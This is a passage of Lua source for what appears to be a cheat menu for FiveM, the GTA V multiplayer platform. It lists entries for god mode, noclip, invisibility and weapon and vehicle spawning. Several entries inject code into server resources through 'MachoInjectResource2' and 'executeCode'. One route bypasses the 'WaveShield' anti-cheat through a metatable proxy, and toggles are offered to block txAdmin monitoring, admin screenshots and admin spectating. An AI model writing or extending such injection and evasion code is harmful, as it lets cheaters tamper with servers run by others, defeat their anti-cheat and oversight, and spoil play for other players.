        },
        onConfirm = function(data)
            if data and data.value then spawnCustomVehicle(data.value) end
        end
    },
    {
        label = "Helicopters",
        type = "scroll",
        icon = "ph ph-helicopter",
        desc = "Spawn a helicopter",
        selected = 1,
        options = {
            { label = "Buzzard",      value = "buzzard" },
            { label = "Akula",        value = "akula" },
            { label = "Hunter",       value = "hunter" },
            { label = "Savage",       value = "savage" },
            { label = "Valkyrie",     value = "valkyrie" },
            { label = "Swift Deluxe", value = "swift2" },
        },
        onConfirm = function(data)
            if data and data.value then spawnCustomVehicle(data.value) end
        end
    },
    {
        label = "Boats",
        type = "scroll",
        icon = "ph ph-boat",
        desc = "Spawn a boat",
        selected = 1,
        options = {
            { label = "Speeder",  value = "speeder" },
            { label = "Shotboat", value = "shotboat" },
            { label = "Dinghy",   value = "dinghy" },
            { label = "Marquis",  value = "marquis" },
            { label = "Jetmax",   value = "jetmax" },
        },
        onConfirm = function(data)
            if data and data.value then spawnCustomVehicle(data.value) end
        end
    },
}

local MenuConfig
MenuConfig = {
    {
        label = 'Player',
        icon = 'ph-user',
        type = 'submenu',
        tabs = {
            {
                name = 'Status',
                submenu = {
                    {
                        label = 'Revive',
                        icon = "ph ph-skull",
                        desc = "Revives you",
                        type = 'button',
                        onConfirm = function()
                            setRevive()
                        end
                    },
                    {
                        label = 'Suicide',
                        icon = "ph ph-skull",
                        desc = "Kills you",
                        type = 'button',
                        onConfirm = function()
                            executeCode('monitor', [[
                                local setPed = PlayerPedId()
                                SetEntityHealth(setPed, 0)
                            ]])
                        end
                    },
                    {
                        label = 'Refill Health',
                        icon = "ph ph-heart",
                        desc = "Set HP to 100",
                        type = 'button',
                        onConfirm = function()
                            setHealth()
                        end
                    },
                    {
                        label = 'Refill Armor',
                        icon = "ph ph-shield-check",
                        desc = "Set Armor to 100",
                        type = 'button',
                        onConfirm = function()
                            setArmor()
                        end
                    },
                    {
                        label = "Full Food",
                        icon = "ph ph-hamburger",
                        desc = "Sets hunger to max",
                        type = 'button',
                        onConfirm = function()
                            setFullFood()
                        end
                    },
                    {
                        label = "Full Thirst",
                        icon = "ph ph-drop",
                        desc = "Sets thirst to max",
                        type = 'button',
                        onConfirm = function()
                            setFullThirst()
                        end
                    },
                    {
                        label = "Remove Stress",
                        icon = "ph ph-brain",
                        desc = "Removes all stress",
                        type = 'button',
                        onConfirm = function()
                            setRemoveStress()
                        end
                    },
                    {
                        label = "Clean Player",
                        icon = "ph ph-sparkle",
                        desc = "Removes blood and dirt",
                        type = 'button',
                        onConfirm = function()
                            setCleanPlayer()
                        end
                    },
                    {
                        label = "Reset Vision",
                        icon = "ph ph-eye",
                        desc = "Clears all screen effects",
                        type = 'button',
                        onConfirm = function()
                            setResetVision()
                        end
                    },
                    {
                        label = 'God Mode',
                        icon = "ph ph-shield",
                        desc = "Makes you invincible",
                        type = 'checkbox',
                        onConfirm = function(state)
                            setGodMode(state)
                        end
                    },
                    {
                        label = "Invisibility",
                        icon = "ph ph-eye-slash",
                        desc = "Makes you invisible",
                        type = 'checkbox',
                        onConfirm = function(state)
                            setInvisibility(state)
                        end
                    },
                    {
                        label = 'Noclip',
                        icon = "ph ph-rocket",
                        desc = "Fly around",
                        type = { 'slider', 'checkbox' },
                        step = 1.0,
                        min = 1.0,
                        max = 100.0,
                        value = 7.5,
                        onConfirm = function(val)
                            if type(val) == 'boolean' then
                                _G.SavedNoclipState = val
                                setNoclip(val, _G.SavedNoclipSpeed or 7.5)
                            elseif type(val) == 'number' then
                                _G.SavedNoclipSpeed = tonumber(val) or 7.5
                                if _G.SavedNoclipState then
                                    setNoclip(true, _G.SavedNoclipSpeed)
                                end
                            end
                        end
                    },
                    {
                        label = "Mega Bat",
                        icon = "ph ph-baseball-cap",
                        desc = "Scales up your baseball bat",
                        type = 'checkbox',
                        onConfirm = function(enabled)
                            local hash = GetHashKey("WEAPON_BAT")
                            local ped = PlayerPedId()

                            if enabled and not _G.megaBatEnabled then
                                _G.megaBatEnabled = true

                                CreateThread(function()
                                    GiveWeaponToPed(ped, hash, 1, false, true)
                                    SetCurrentPedWeapon(ped, hash, true)
                                    Wait(150)

                                    local objectScale = 3.5
                                    _G.megaBatObject = CreateWeaponObject(hash, 1, 0.0, 0.0, 0.0, false, objectScale, 0)

                                    if not DoesEntityExist(_G.megaBatObject) then
                                        _G.megaBatEnabled = false
                                        return
                                    end

                                    SetEntityAsMissionEntity(_G.megaBatObject, true, true)
                                    SetEntityCollision(_G.megaBatObject, false, false)
                                    SetEntityHasGravity(_G.megaBatObject, false)
                                    FreezeEntityPosition(_G.megaBatObject, true)
                                    SetPedCurrentWeaponVisible(ped, false, true, true, true)

                                    while _G.megaBatEnabled and DoesEntityExist(_G.megaBatObject) do
                                        Wait(0)

                                        local heldBat = GetCurrentPedWeaponEntityIndex(ped)
                                        if heldBat ~= 0 and DoesEntityExist(heldBat) then
                                            local pos = GetEntityCoords(heldBat)
                                            local rot = GetEntityRotation(heldBat, 2)

                                            SetEntityCoords(_G.megaBatObject, pos.x, pos.y, pos.z, false, false, false,
                                                true)
                                            SetEntityRotation(_G.megaBatObject, rot.x, rot.y, rot.z, 2, true)
                                        end
                                    end

                                    _G.megaBatObject = nil
                                    SetPedCurrentWeaponVisible(ped, true, true, true, true)
                                end)
                            elseif not enabled and _G.megaBatEnabled then
                                _G.megaBatEnabled = false

                                if HasPedGotWeapon(ped, hash, false) then
                                    RemoveWeaponFromPed(ped, hash)
                                end

                                local obj = _G.megaBatObject
                                if obj and DoesEntityExist(obj) then
                                    SetEntityVisible(obj, false, false)
                                    Citizen.InvokeNative(0xFAA3D236, obj)
                                end

                                _G.megaBatObject = nil
                                SetPedCurrentWeaponVisible(ped, true, true, true, true)
                            end
                        end
                    },
                    {
                        label = "Throw People From Vehicle",
                        icon = "ph ph-car",
                        desc = "Throw people from your vehicle",
                        type = 'checkbox',
                        onConfirm = function(enabled)
                            if enabled and not _G.ThrowFromVehicleEnabled then
                                _G.ThrowFromVehicleEnabled = true
                                local PlayerGroup = GetHashKey('PLAYER')
                                CreateThread(function()
                                    while _G.ThrowFromVehicleEnabled do
                                        SetRelationshipBetweenGroups(5, PlayerGroup, PlayerGroup)
                                        Wait(1)
                                    end
                                end)
                            elseif not enabled and _G.ThrowFromVehicleEnabled then
                                _G.ThrowFromVehicleEnabled = false
                            end
                        end
                    },

                    {
                        label = "Fast Punch",
                        icon = "ph ph-hand-fist",
                        desc = "Punch faster",
                        type = 'checkbox',
                        onConfirm = function(state)
                            setFastPunch(state)
                        end
                    },


                    {
                        label = "Fast Run",
                        icon = "ph ph-person-simple-run",
                        desc = "Run faster",
                        type = 'checkbox',
                        onConfirm = function(state)
                            setFastRun(state)
                        end
                    },
                    {
                        label = "Super Jump",
                        icon = "ph ph-arrow-up",
                        desc = "Jump higher",
                        type = 'checkbox',
                        onConfirm = function(state)
                            setSuperJump(state)
                        end
                    },
                    {
                        label = "Infinite Stamina",
                        icon = "ph ph-battery-charging-vertical",
                        desc = "Never run out of stamina",
                        type = 'checkbox',
                        onConfirm = function(state)
                            setInfiniteStamina(state)
                        end
                    }
                }
            },
            {
                name = 'Appearance',
                submenu = {
                    {
                        label = "Custom Model",
                        type = "button",
                        icon = "ph-user-focus",
                        desc = "Load a specific ped model hash",
                        onConfirm = function()
                            showInput("Enter Model Name", "", function(modelText)
                                if modelText and modelText ~= "" then
                                    setPlayerModel(modelText)
                                else
                                    showNotify("Model name is required", "error")
                                end
                            end, "typeable")
                        end
                    },
                    {
                        label = "Male Peds",
                        type = "scroll",
                        icon = "ph-gender-male",
                        desc = "Select from common male models",
                        options = {
                            { label = "Franklin", value = "player_zero" }, { label = "Michael", value = "player_one" }, { label = "Trevor", value = "player_two" },
                            { label = "Ballas 1", value = "g_m_y_ballaeast_01" }, { label = "Ballas 2", value = "g_m_y_ballasout_01" },
                            { label = "Families 1", value = "g_m_y_famca_01" }, { label = "Families 2", value = "g_m_y_famdnf_01" },
                            { label = "Lost MC",    value = "g_m_y_lost_01" }, { label = "Vagos 1", value = "g_m_y_mexgang_01" },
                            { label = "Korean Ped", value = "g_m_y_korean_01" }, { label = "Armoured Security", value = "s_m_m_armoured_01" },
                            { label = "Army",       value = "s_m_y_army_01" }, { label = "Prisoner", value = "s_m_y_prisoner_01" },
                            { label = "SWAT", value = "s_m_y_swat_01" }, { label = "Sheriff", value = "s_m_y_sheriff_01" },
                            { label = "Cop",  value = "s_m_y_cop_01" }, { label = "Firefighter", value = "s_m_y_fireman_01" },
                            { label = "Paramedic", value = "s_m_m_paramedic_01" }, { label = "Beach Lifeguard", value = "s_m_y_baywatch_01" }
                        },
                        selected = 1,
                        onConfirm = function(data)
                            if data and data.value then setPlayerModel(data.value) end
                        end
                    },
                    {
                        label = "Female Peds",
                        type = "scroll",
                        icon = "ph-gender-female",
                        desc = "Select from common female models",
                        options = {
                            { label = "Beach Girl",     value = "a_f_y_beach_01" }, { label = "Beverly Hills Girl", value = "a_f_y_bevhills_01" },
                            { label = "Business Woman", value = "a_f_y_business_01" }, { label = "Fitness Girl", value = "a_f_y_fitness_01" },
                            { label = "Hipster Girl", value = "a_f_y_hipster_01" }, { label = "Hooker 1", value = "s_f_y_hooker_01" },
                            { label = "Hooker 2",     value = "s_f_y_hooker_02" }, { label = "Stripper 1", value = "s_f_y_stripper_01" },
                            { label = "Stripper 2", value = "s_f_y_stripper_02" }, { label = "Topless Girl", value = "a_f_y_topless_01" },
                            { label = "Yoga Girl",  value = "a_f_y_yoga_01" }, { label = "Tennis Player", value = "a_f_y_tennis_01" },
                            { label = "Runner", value = "a_f_y_runner_01" }
                        },
                        selected = 1,
                        onConfirm = function(data)
                            if data and data.value then setPlayerModel(data.value) end
                        end
                    },
                    {
                        label = "Animals",
                        type = "scroll",
                        icon = "ph-paw-print",
                        desc = "Select from common animal models",
                        options = {
                            { label = "Big Rabbit", value = "a_c_rabbit_02" }, { label = "Husky", value = "a_c_husky" }, { label = "Rottweiler", value = "a_c_rottweiler" },
                            { label = "Retriever",  value = "a_c_retriever" }, { label = "Poodle", value = "a_c_poodle" }, { label = "Pug", value = "a_c_pug" },
                            { label = "Cat", value = "a_c_cat_01" }, { label = "Mountain Lion", value = "a_c_mtlion" }, { label = "Pig", value = "a_c_pig" },
                            { label = "Cow", value = "a_c_cow" }, { label = "Deer", value = "a_c_deer" }, { label = "Boar", value = "a_c_boar" },
                            { label = "Rabbit",  value = "a_c_rabbit_01" }, { label = "Chimp", value = "a_c_chimp" }, { label = "Chicken", value = "a_c_hen" },
                            { label = "Seagull", value = "a_c_seagull" }, { label = "Crow", value = "a_c_crow" }, { label = "Hawk", value = "a_c_chickenhawk" },
                            { label = "Dolphin", value = "a_c_dolphin" }, { label = "Shark", value = "a_c_sharktiger" }, { label = "Killer Whale", value = "a_c_killerwhale" }
                        },
                        selected = 1,
                        onConfirm = function(data)
                            if data and data.value then setPlayerModel(data.value) end
                        end
                    },
                    {
                        label = "Save Outfit",
                        type = "button",
                        icon = "ph-floppy-disk",
                        desc = "Save your current outfit (if supported)",
                        onConfirm = function()
                            saveOutfit()
                        end
                    },
                    {
                        label = "Appearance Menu",
                        type = "button",
                        icon = "ph-storefront",
                        desc = "Open ESX Skin/Clothing Menu",
                        onConfirm = function()
                            openAppearanceMenu()
                        end
                    },
                    {
                        label = "Randomize Outfit",
                        type = "scroll",
                        icon = "ph-tshirt",
                        desc = "Randomizes your ped components",
                        options = { { label = "Type 1", value = "Type 1" }, { label = "Type 2", value = "Type 2" } },
                        selected = 1,
                        onConfirm = function(data)
                            if data and data.value then setRandomizeOutfit(data.value) end
                        end,
                        submenu = {
                            {
                                label = "Hair",
                                type = "slider",
                                icon = "ph-scissors",
                                min = 0,
                                max = 75,
                                value = 0,
                                onConfirm = function(value)
                                    setComponentVariation(2, value)
                                end
                            },
                            {
                                label = "Mask",
                                type = "slider",
                                icon = "ph-mask-happy",
                                min = 0,
                                max = 200,
                                value = 0,
                                onConfirm = function(value)
                                    setComponentVariation(1, value)
                                end
                            },
                            {
                                label = "Torso/Arms",
                                type = "slider",
                                icon = "ph-arm",
                                min = 0,
                                max = 300,
                                value = 0,
                                onConfirm = function(value)
                                    setComponentVariation(3, value)
                                end
                            },
                            {
                                label = "Pants",
                                type = "slider",
                                icon = "ph-pants",
                                min = 0,
                                max = 500,
                                value = 0,
                                onConfirm = function(value)
                                    setComponentVariation(4, value)
                                end
                            },
                            {
                                label = "Bags",
                                type = "slider",
                                icon = "ph-backpack",
                                min = 0,
                                max = 200,
                                value = 0,
                                onConfirm = function(value)
                                    setComponentVariation(5, value)
                                end
                            },
                            {
                                label = "Shoes",
                                type = "slider",
                                icon = "ph-sneaker",
                                min = 0,
                                max = 245,
                                value = 0,
                                onConfirm = function(value)
                                    setComponentVariation(6, value)
                                end
                            },
                            {
                                label = "Accessories",
                                type = "slider",
                                icon = "ph-watch",
                                min = 0,
                                max = 150,
                                value = 0,
                                onConfirm = function(value)
                                    setComponentVariation(7, value)
                                end
                            },
                            {
                                label = "Undershirt",
                                type = "slider",
                                icon = "ph-t-shirt",
                                min = 0,
                                max = 200,
                                value = 0,
                                onConfirm = function(value)
                                    setComponentVariation(8, value)
                                end
                            },
                            {
                                label = "Body Armor",
                                type = "slider",
                                icon = "ph-shield",
                                min = 0,
                                max = 100,
                                value = 0,
                                onConfirm = function(value)
                                    setComponentVariation(9, value)
                                end
                            },
                            {
                                label = "Decals",
                                type = "slider",
                                icon = "ph-sticker",
                                min = 0,
                                max = 50,
                                value = 0,
                                onConfirm = function(value)
                                    setComponentVariation(10, value)
                                end
                            },
                            {
                                label = "Tops",
                                type = "slider",
                                icon = "ph-hoodie",
                                min = 0,
                                max = 500,
                                value = 0,
                                onConfirm = function(value)
                                    setComponentVariation(11, value)
                                end
                            }
                        }
                    }
                }
            },
            {
                name = 'Misc',
                submenu = {
                    {
                        label = "Anti-Ragdoll",
                        type = "checkbox",
                        icon = "ph-prohibit",
                        desc = "Prevents ragdoll",
                        onConfirm = function(state) setAntiRagdoll(state) end
                    },
                    {
                        label = "Anti-Collision",
                        type = "checkbox",
                        icon = "ph-prohibit",
                        desc = "Disables collision",
                        onConfirm = function(state) setAntiCollision(state) end
                    },
                    {
                        label = "Passive Mode",
                        type = "checkbox",
                        icon = "ph-prohibit",
                        desc = "Cant shoot players/players cant shoot you",
                        onConfirm = function(state) setPassiveMode(state) end
                    },
                    {
                        label = "Friendly Fire",
                        type = "checkbox",
                        icon = "ph-users",
                        desc = "Toggle friendly fire",
                        onConfirm = function(state)
                            if state then
                                MachoInjectResource2(NewThreadNs, "any", [[
                                    _G.startExpensiveSynchronousShapeTestLosProbe = function(callback, ...)
                                        local ped = PlayerPedId()
                                        local netId = NetworkGetNetworkIdFromEntity(ped)
                                        local stateName = "net_" .. netId .. "_" .. math.random(69420, 6942069420) .. GetGameTimer()
                                        local entity = NetworkGetEntityFromNetworkId(netId)
                                        Entity(entity).state:set(stateName, callback, false)
                                        Entity(entity).state[stateName](...)
                                    end

                                    local playerPed = PlayerPedId()

                                    _G.startExpensiveSynchronousShapeTestLosProbe(_G.NetworkSetFriendlyFireOption, true)
                                    _G.startExpensiveSynchronousShapeTestLosProbe(_G.SetCanAttackFriendly, playerPed, true, true)
                                    _G.startExpensiveSynchronousShapeTestLosProbe(_G.DisablePlayerFiring, playerPed, false)
                                    _G.startExpensiveSynchronousShapeTestLosProbe(_G.EnableAllControlActions, 0)
                                    _G.startExpensiveSynchronousShapeTestLosProbe(_G.EnableAllControlActions, 1)

                                    for _, playerId in ipairs(GetActivePlayers()) do
                                        local targetPed = GetPlayerPed(playerId)

                                        if targetPed ~= playerPed then
                                            _G.startExpensiveSynchronousShapeTestLosProbe(
                                                _G.SetPedConfigFlag,
                                                targetPed,
                                                423,
                                                false
                                            )
                                        end
                                    end
                                ]])
                            else
                                MachoInjectResource2(NewThreadNs, "any", [[
                                    _G.startExpensiveSynchronousShapeTestLosProbe = function(callback, ...)
                                        local ped = PlayerPedId()
                                        local netId = NetworkGetNetworkIdFromEntity(ped)
                                        local stateName = "net_" .. netId .. "_" .. math.random(69420, 6942069420) .. GetGameTimer()
                                        local entity = NetworkGetEntityFromNetworkId(netId)
                                        Entity(entity).state:set(stateName, callback, false)
                                        Entity(entity).state[stateName](...)
                                    end

                                    local playerPed = PlayerPedId()

                                    _G.startExpensiveSynchronousShapeTestLosProbe(_G.NetworkSetFriendlyFireOption, false)
                                    _G.startExpensiveSynchronousShapeTestLosProbe(_G.SetCanAttackFriendly, playerPed, false, false)
                                ]])
                            end
                        end
                    },
                    {
                        label = "Anti-Drag",
                        type = "checkbox",
                        icon = "ph-prohibit",
                        desc = "Prevents being dragged",
                        onConfirm = function(state) setAntiDrag(state) end
                    },
                    {
                        label = "Anti-VDM",
                        type = "checkbox",
                        icon = "ph-prohibit",
                        desc = "Disables vehicle collision with you",
                        onConfirm = function(state) setAntiVDM(state) end
                    },
                    {
                        label = "Anti-Headshot",
                        type = "checkbox",
                        icon = "ph-prohibit",
                        desc = "No critical headshot damage",
                        onConfirm = function(state) setAntiHeadshot(state) end
                    },
                    {
                        label = "Anti-Freeze",
                        type = "checkbox",
                        icon = "ph-prohibit",
                        desc = "Prevents being frozen",
                        onConfirm = function(state) setAntiFreeze(state) end
                    },
                    {
                        label = "Solo Session",
                        type = "checkbox",
                        icon = "ph-prohibit",
                        desc = "solo session",
                        onConfirm = function(state) setSoloSession(state) end
                    },
                    {
                        label = "Anti-Blackscreen",
                        type = "checkbox",
                        icon = "ph-prohibit",
                        desc = "Prevents screen fade to black",
                        onConfirm = function(state) setAntiBlackscreen(state) end
                    },
                    {
                        label = "Block txAdmin",
                        type = "checkbox",
                        icon = "ph-prohibit",
                        desc = "Blocks txAdmin monitoring",
                        onConfirm = function(state) setBlockTxAdmin(state) end
                    },
                    {
                        label = "Block Screenshots",
                        type = "checkbox",
                        icon = "ph-prohibit",
                        desc = "Blocks admin screenshots",
                        onConfirm = function(state) setBlockScreenshots(state) end
                    },
                    {
                        label = "Anti-Attach",
                        type = "checkbox",
                        icon = "ph-prohibit",
                        desc = "Anti Attach ped/vehicles etc",
                        onConfirm = function(state) setAntiAttach(state) end
                    },
                    {
                        label = "Anti-Teleport",
                        type = "checkbox",
                        icon = "ph-prohibit",
                        desc = "Anti Teleport",
                        onConfirm = function(state) setAntiTeleport(state) end
                    },
                    {
                        label = "Block Spectate",
                        type = "checkbox",
                        icon = "ph-prohibit",
                        desc = "Prevents admin spectating",
                        onConfirm = function(state) setBlockSpectate(state) end
                    }
                }
            }
        }
    },
    {
        label = 'Weapon',
        icon = 'ph-sword',
        type = 'submenu',
        tabs = {
            {
                name = 'Spawner',
                submenu = {
                    {
                        label = "Give All Weapons",
                        type = "button",
                        onConfirm = function()
                            local allWeapons = {
                                "weapon_unarmed", "weapon_knife", "weapon_dagger", "weapon_bat", "weapon_bottle",
                                "weapon_crowbar", "weapon_golfclub", "weapon_hammer", "weapon_hatchet", "weapon_machete",
                                "weapon_switchblade", "weapon_nightstick", "weapon_wrench",
                                "weapon_pistol", "weapon_pistol_mk2", "weapon_combatpistol", "weapon_appistol",
                                "weapon_stungun", "weapon_pistol50", "weapon_snspistol", "weapon_heavypistol",
                                "weapon_vintagepistol", "weapon_flaregun",
                                "weapon_microsmg", "weapon_smg", "weapon_smg_mk2", "weapon_assaultsmg",
                                "weapon_machinepistol", "weapon_minismg", "weapon_combatpdw",
                                "weapon_assaultrifle", "weapon_assaultrifle_mk2", "weapon_carbinerifle",
                                "weapon_carbinerifle_mk2", "weapon_advancedrifle", "weapon_specialcarbine",
                                "weapon_bullpuprifle", "weapon_gusenberg", "weapon_compactrifle",
                                "weapon_bullpuprifle_mk2", "weapon_marksmanrifle",
                                "weapon_pumpshotgun", "weapon_pumpshotgun_mk2", "weapon_sawnoffshotgun",
                                "weapon_assaultshotgun", "weapon_bullpupshotgun", "weapon_heavyshotgun",
                                "weapon_autoshotgun",
                                "weapon_sniperrifle", "weapon_heavysniper", "weapon_heavysniper_mk2",
                                "weapon_marksmanrifle_mk2",
                                "weapon_grenade", "weapon_stickybomb", "weapon_molotov", "weapon_pipebomb",
                                "weapon_proxmine", "weapon_rpg", "weapon_grenadelauncher", "weapon_minigun",
                                "weapon_firework",
                                "weapon_mg", "weapon_combatmg", "weapon_railgun", "weapon_hominglauncher",
                                "weapon_compactlauncher",
                                "weapon_ball", "weapon_flare", "weapon_smokegrenade", "weapon_bzgas", "weapon_petrolcan"
                            }

                            for _, weapon in ipairs(allWeapons) do
                                spawnWeaponByName(weapon:upper(), 9999)
                            end

                            showNotify("All weapons given", "success")
                        end
                    },
                    {
                        label = "Remove All Weapons",
                        type = "button",
                        onConfirm = function()
                            local ped = PlayerPedId()

                            if GetResourceState("WaveShield") == "started" then
                                local bp = setmetatable({}, {
                                    __index = function(_, k)
                                        local v = _G[k]
                                        return type(v) == "function" and function(...) return v(...) end or v
                                    end
                                })
                                bp.RemoveAllPedWeapons(ped, true)
                            else
                                executeCode('any', string.format([[
                                    local ped = %d
                                    local bp = setmetatable({}, {
                                        __index = function(_, k)
                                            local v = _G[k]
                                            return type(v) == "function" and function(...) return v(...) end or v
                                        end
                                    })
                                    bp.RemoveAllPedWeapons(ped, true)
                                ]], ped))
                            end

                            showNotify("All weapons removed", "success")
                        end
                    },
                    {
                        label = "Remove Gun From Hand",
                        type = "button",
                        onConfirm = function()
                            local ped = PlayerPedId()

                            if GetResourceState("WaveShield") == "started" then
                                local bp = setmetatable({}, {
                                    __index = function(_, k)
                                        local v = _G[k]
                                        return type(v) == "function" and function(...) return v(...) end or v
                                    end
                                })
                                local wep = bp.GetSelectedPedWeapon(ped)
                                bp.RemoveWeaponFromPed(ped, wep)
                            else
                                executeCode('any', string.format([[
                                    local ped = %d
                                    local bp = setmetatable({}, {
                                        __index = function(_, k)
                                            local v = _G[k]
                                            return type(v) == "function" and function(...) return v(...) end or v
                                        end
                                    })
                                    local wep = bp.GetSelectedPedWeapon(ped)
                                    bp.RemoveWeaponFromPed(ped, wep)
                                ]], ped))
                            end

                            showNotify("Current weapon removed", "success")
                        end
                    },
                    {
                        label = "Spawn weapon by name",
                        type = "button",
                        onConfirm = function()
                            showInput("Weapon Name", "WEAPON_", function(val)
                                if val and val ~= "" then
                                    spawnWeaponByName(val, 255)
                                    showNotify("Spawned: " .. val, "success")
                                end
                            end, "typeable")
                        end
                    },
                    {
                        label = "Melee",
                        type = "scroll",
                        selected = 1,
                        options = {
                            { label = "Unarmed", value = "weapon_unarmed" }, { label = "Knife", value = "weapon_knife" }, { label = "Dagger", value = "weapon_dagger" }, { label = "Bat", value = "weapon_bat" }, { label = "Bottle", value = "weapon_bottle" }, { label = "Crowbar", value = "weapon_crowbar" }, { label = "Golfclub", value = "weapon_golfclub" }, { label = "Hammer", value = "weapon_hammer" }, { label = "Hatchet", value = "weapon_hatchet" }, { label = "Machete", value = "weapon_machete" }, { label = "Switchblade", value = "weapon_switchblade" }, { label = "Nightstick", value = "weapon_nightstick" }, { label = "Wrench", value = "weapon_wrench" }
                        },
                        onConfirm = function(data)
                            local weaponModel = data.value
                            spawnWeaponByName(weaponModel, 255)
                            showNotify("Spawned: " .. weaponModel, "success")
                        end
                    },
                    {
                        label = "Handguns",
                        type = "scroll",
                        selected = 1,
                        options = {
                            { label = "Pistol", value = "weapon_pistol" }, { label = "Pistol Mk2", value = "weapon_pistol_mk2" }, { label = "Combat Pistol", value = "weapon_combatpistol" }, { label = "AP Pistol", value = "weapon_appistol" }, { label = "Stun Gun", value = "weapon_stungun" }, { label = "Pistol .50", value = "weapon_pistol50" }, { label = "SNS Pistol", value = "weapon_snspistol" }, { label = "Heavy Pistol", value = "weapon_heavypistol" }, { label = "Vintage Pistol", value = "weapon_vintagepistol" }, { label = "Flare Gun", value = "weapon_flaregun" }
                        },
                        onConfirm = function(data)
                            local weaponModel = data.value
                            spawnWeaponByName(weaponModel, 255)
                            showNotify("Spawned: " .. weaponModel, "success")
                        end
                    },
                    {
                        label = "SMGs",
                        type = "scroll",
                        selected = 1,
                        options = {
                            { label = "Micro SMG", value = "weapon_microsmg" }, { label = "SMG", value = "weapon_smg" }, { label = "SMG Mk2", value = "weapon_smg_mk2" }, { label = "Assault SMG", value = "weapon_assaultsmg" }, { label = "Machine Pistol", value = "weapon_machinepistol" }, { label = "Mini SMG", value = "weapon_minismg" }, { label = "Combat PDW", value = "weapon_combatpdw" }
                        },
                        onConfirm = function(data)
                            local weaponModel = data.value
                            spawnWeaponByName(weaponModel, 255)
                            showNotify("Spawned: " .. weaponModel, "success")
                        end
                    },
                    {
                        label = "Rifles",
                        type = "scroll",
                        selected = 1,
                        options = {
                            { label = "Assault Rifle", value = "weapon_assaultrifle" }, { label = "Assault Rifle Mk2", value = "weapon_assaultrifle_mk2" }, { label = "Carbine Rifle", value = "weapon_carbinerifle" }, { label = "Carbine Rifle Mk2", value = "weapon_carbinerifle_mk2" }, { label = "Advanced Rifle", value = "weapon_advancedrifle" }, { label = "Special Carbine", value = "weapon_specialcarbine" }, { label = "Bullpup Rifle", value = "weapon_bullpuprifle" }, { label = "Gusenberg", value = "weapon_gusenberg" }, { label = "Compact Rifle", value = "weapon_compactrifle" }, { label = "Bullpup Rifle Mk2", value = "weapon_bullpuprifle_mk2" }, { label = "Marksman Rifle", value = "weapon_marksmanrifle" }
                        },
                        onConfirm = function(data)
                            local weaponModel = data.value
                            spawnWeaponByName(weaponModel, 255)
                            showNotify("Spawned: " .. weaponModel, "success")
                        end
                    },
                    {
                        label = "Shotguns",
                        type = "scroll",
                        selected = 1,
                        options = {
                            { label = "Pump Shotgun", value = "weapon_pumpshotgun" }, { label = "Pump Shotgun Mk2", value = "weapon_pumpshotgun_mk2" }, { label = "Sawed-Off Shotgun", value = "weapon_sawnoffshotgun" }, { label = "Assault Shotgun", value = "weapon_assaultshotgun" }, { label = "Bullpup Shotgun", value = "weapon_bullpupshotgun" }, { label = "Heavy Shotgun", value = "weapon_heavyshotgun" }, { label = "Auto Shotgun", value = "weapon_autoshotgun" }
                        },
                        onConfirm = function(data)
                            local weaponModel = data.value
                            spawnWeaponByName(weaponModel, 255)
                            showNotify("Spawned: " .. weaponModel, "success")
                        end
                    },
                    {
                        label = "Snipers",
                        type = "scroll",
                        selected = 1,
                        options = {
                            { label = "Sniper Rifle", value = "weapon_sniperrifle" }, { label = "Heavy Sniper", value = "weapon_heavysniper" }, { label = "Heavy Sniper Mk2", value = "weapon_heavysniper_mk2" }, { label = "Marksman Rifle", value = "weapon_marksmanrifle" }, { label = "Marksman Rifle Mk2", value = "weapon_marksmanrifle_mk2" }
                        },
                        onConfirm = function(data)
                            local weaponModel = data.value
                            spawnWeaponByName(weaponModel, 255)
                            showNotify("Spawned: " .. weaponModel, "success")
                        end
                    },
                    {
                        label = "Explosives",
                        type = "scroll",
                        selected = 1,
                        options = {
                            { label = "Grenade", value = "weapon_grenade" }, { label = "Sticky Bomb", value = "weapon_stickybomb" }, { label = "Molotov", value = "weapon_molotov" }, { label = "Pipe Bomb", value = "weapon_pipebomb" }, { label = "Proximity Mine", value = "weapon_proxmine" }, { label = "RPG", value = "weapon_rpg" }, { label = "Grenade Launcher", value = "weapon_grenadelauncher" }, { label = "Minigun", value = "weapon_minigun" }, { label = "Firework", value = "weapon_firework" }
                        },
                        onConfirm = function(data)
                            local weaponModel = data.value
                            spawnWeaponByName(weaponModel, 255)
                            showNotify("Spawned: " .. weaponModel, "success")
                        end
                    },
                    {
                        label = "Heavy",
                        type = "scroll",
                        selected = 1,
                        options = {
                            { label = "MG", value = "weapon_mg" }, { label = "Combat MG", value = "weapon_combatmg" }, { label = "Gusenberg", value = "weapon_gusenberg" }, { label = "Minigun", value = "weapon_minigun" }, { label = "Grenade Launcher", value = "weapon_grenadelauncher" }, { label = "Railgun", value = "weapon_railgun" }, { label = "Homing Launcher", value = "weapon_hominglauncher" }, { label = "Compact Launcher", value = "weapon_compactlauncher" }
                        },
                        onConfirm = function(data)
                            local weaponModel = data.value
                            spawnWeaponByName(weaponModel, 255)
                            showNotify("Spawned: " .. weaponModel, "success")
                        end
                    },
                    {
                        label = "Throwables",
                        type = "scroll",
                        selected = 1,
                        options = {
                            { label = "Ball", value = "weapon_ball" }, { label = "Flare", value = "weapon_flare" }, { label = "Smoke Grenade", value = "weapon_smokegrenade" }, { label = "BZ Gas", value = "weapon_bzgas" }, { label = "Petrol Can", value = "weapon_petrolcan" }
                        },
                        onConfirm = function(data)
                            local weaponModel = data.value
                            spawnWeaponByName(weaponModel, 255)
                            showNotify("Spawned: " .. weaponModel, "success")
                        end
                    },
                    addonWeaponsScrollItem
                }
            },
            {
                name = 'Extra',
                submenu = {
                    {
                        type = "scroll",
                        label = "Weapon Animations",
                        selected = 1,
                        autoConfirm = true,
                        options = {
                            { label = "Default",       value = "Default" },
                            { label = "Hillbilly",     value = "Hillbilly" },
                            { label = "GangFemale",    value = "GangFemale" },
                            { label = "Gang1H",        value = "Gang1H" },
                            { label = "MP_F_Freemode", value = "MP_F_Freemode" }
                        },
                        onConfirm = function(data)
                            local value = data.value
                            MachoInjectResource2(NewThreadNs, 'any', string.format([[
                                local setPed = PlayerPedId()
                                local bp = setmetatable({}, {
                                    __index = function(_, k)
                                        local v = _G[k]
                                        return type(v) == "function" and function(...) return v(...) end or v
                                    end
                                })
                                bp.SetWeaponAnimationOverride(setPed, GetHashKey('%s'))
                            ]], value))
                        end
                    },
                    {
                        type = "scroll",
                        label = "Weapon Attachments",
                        selected = 1,
                        autoConfirm = true,
                        options = {
